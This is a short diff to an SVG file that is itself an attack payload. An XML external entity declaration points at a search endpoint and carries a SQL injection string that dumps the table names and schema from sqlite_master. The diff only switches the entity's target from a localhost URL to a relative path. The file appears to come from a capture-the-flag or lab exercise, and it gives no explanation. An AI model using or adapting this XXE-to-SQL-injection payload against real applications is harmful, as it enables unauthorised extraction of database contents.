@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-    <!ENTITY xxe SYSTEM "http://localhost:8001/search?q=') UNION SELECT name, sql FROM sqlite_master WHERE type='table'; --">
+    <!ENTITY xxe SYSTEM "/search?q=') UNION SELECT name, sql FROM sqlite_master WHERE type='table'; --">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
     <rect width="1000" height="1000" fill="white"/>
